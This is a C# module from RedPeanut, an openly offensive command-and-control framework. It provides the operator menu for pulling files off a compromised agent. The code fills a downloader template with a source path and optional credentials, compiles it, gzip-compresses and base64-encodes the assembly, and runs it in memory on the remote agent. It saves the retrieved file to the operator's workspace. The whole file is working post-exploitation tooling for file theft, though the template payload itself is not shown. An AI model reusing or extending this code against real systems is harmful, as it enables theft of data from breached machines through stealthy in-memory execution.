//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class DownLoadManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set filesrc", "File to download" },
            { "set filename", "File destination name, you will find the file in workspace downloads folder" },
            { "set username", "Set username" },
            { "set password", "Set password" },
            { "run", "Execute module" },
            { "options", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "download";

        string filesrc = "";
        string filename = "";
        string username = "";
        string password = "";
        string domain = "";

        bool exit = false;

        public DownLoadManager()
        {

        }

        public DownLoadManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                DownLoadMenu(input);
            } while (!exit);
        }

        private void DownLoadMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "run":
                            Run();
                            break;
                        case "set filesrc":
                            filesrc = GetParsedSetString(input);
                            break;
                        case "set filename":
                            filename = GetParsedSetString(input);
                            break;
                        case "set username":
                            username = GetParsedSetString(input);
                            break;
                        case "set password":
                            password = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            
            if (string.IsNullOrEmpty(filesrc) || string.IsNullOrEmpty(filename))
                return;

            try
            {
                string srcpath = "";
                if (!string.IsNullOrEmpty(filesrc))
                    srcpath = filesrc.Replace("\\", "\\\\");

                string filedest = "";
                if (!string.IsNullOrEmpty(filename))
                    filedest = filename;

                string domainname = ".";
                if (!string.IsNullOrEmpty(domain))
                    domainname = domain;

                // Parse .cs sorce and repalce variable
                string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);

                string source = File.ReadAllText(Path.Combine(folderrpath, FILEDOWNLOAD_TEMPLATE));
                source = Replacer.ReplaceFileDownLoad(source, srcpath, username, password, domainname);

                string assembly = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, "FileDownLoader.dll",agent.TargetFramework)));

                RunAssemblyBase64(assembly, "FileDownLoader", new string[] { " " }, agent, "download",filedest);
            }
            catch(Exception )
            {
                Console.WriteLine("[*] Error creating task");
            }

        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "filesrc", filesrc },
                { "filename", filename },
                { "username", username },
                { "domain", domain },
                { "password", password }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
